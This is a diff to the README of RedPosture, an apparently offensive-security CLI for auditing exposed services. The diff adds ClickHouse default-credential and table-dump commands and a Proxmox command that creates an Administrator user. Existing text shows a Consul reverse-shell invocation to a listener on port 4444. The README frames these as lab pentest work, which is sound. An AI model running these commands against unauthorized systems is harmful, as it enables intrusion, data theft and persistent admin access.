@@ -3,7 +3,7 @@
 RedPosture is a Python security CLI for:
 
 - exporter discovery / trigger / collect workflows (`exporters`)
-- service exposure auditing (`registry`, `grafana`, `proxmox`, `gitlab`, `consul`, `qdrant`, `kubeapi`, `postgres`, `redis`, `etcd`, `kafka`, `zookeeper`)
+- service exposure auditing (`registry`, `grafana`, `proxmox`, `gitlab`, `consul`, `qdrant`, `kubeapi`, `postgres`, `clickhouse`, `redis`, `etcd`, `kafka`, `zookeeper`)
 - listener-based callback capture for lab SSRF workflows
 
 Use only on systems you own or are explicitly authorized to assess.
@@ -36,6 +36,7 @@ redposture gitlab -h
 redposture consul -h
 redposture kubeapi -h
 redposture postgres -h
+redposture clickhouse -h
 redposture redis -h
 redposture etcd -h
 redposture qdrant -h
@@ -130,12 +131,6 @@ redposture consul -t 127.0.0.1 --ssrf-target 127.0.0.1 --ssrf-port 3000,9115 --s
 redposture consul -t 127.0.0.1 --revshell --lhost host.docker.internal --lport 4444 --listen
 ```
 
-Useful follow-ups:
-
-- Check dump auto-prints `script/type/namespace/partition/definition` when available
-- Cleanup one check: `redposture consul -t 127.0.0.1 --delete --check-id rev-rp-lab-01`
-- ACL lab token file: `docker/consul/output/consul_acl_tokens.env`
-
 ### Kubernetes API (`kubeapi`)
 
 ```bash
@@ -160,6 +155,22 @@ redposture postgres -t 127.0.0.1 --defcreds
 
 # Basic enum
 redposture postgres -t 127.0.0.1 -u postgres -p postgres --show-databases
+```
+
+### ClickHouse
+
+```bash
+# Baseline (native protocol)
+redposture clickhouse -t 127.0.0.1
+
+# HTTP/HTTPS API mode
+redposture clickhouse -t 127.0.0.1 --http
+
+# Default creds check (always checks default:<empty> and default:default)
+redposture clickhouse -t 127.0.0.1 --defcreds
+
+# SQL query + table dump
+redposture clickhouse -t 127.0.0.1 --sql-cmd "SELECT version()" --table audit.events --dump
 ```
 
 ### Redis
@@ -193,6 +204,9 @@ redposture etcd -t 127.0.0.1 --dump
 ```bash
 # Lab mock (docker-compose.lab.yml service: proxmox-mock)
 redposture proxmox -t 127.0.0.1 --port 18006 --insecure --pveapitoken 'audit@pve!redposture=pve-redposture-token-2026' --nodes --users
+
+# Create user (admin token required, password is auto-generated, role Administrator on / is granted)
+redposture proxmox -t 127.0.0.1 --port 18006 --insecure --pveapitoken 'admin@pve!root=pve-redposture-admin-2026' -add-user redposture_bot --users
 ```
 
 ### Qdrant
@@ -255,6 +269,3 @@ python3 -m venv .venv
 
 - `txt` output is terminal-oriented; use `-f json` for parsing.
 - Use `-h` on each module for full flag dependencies and edge-case behavior.
-- `consul` lab containers are Ubuntu-based in the lab compose to make script-check behavior more realistic.
-- `qdrant` lab container is pinned to an intentionally vulnerable version for safe GHSA `/logger` detection demos.
-- invalid provided credentials in `grafana/postgres/redis/kafka/zookeeper/registry` are shown in a unified short form: `[-] username:password`.
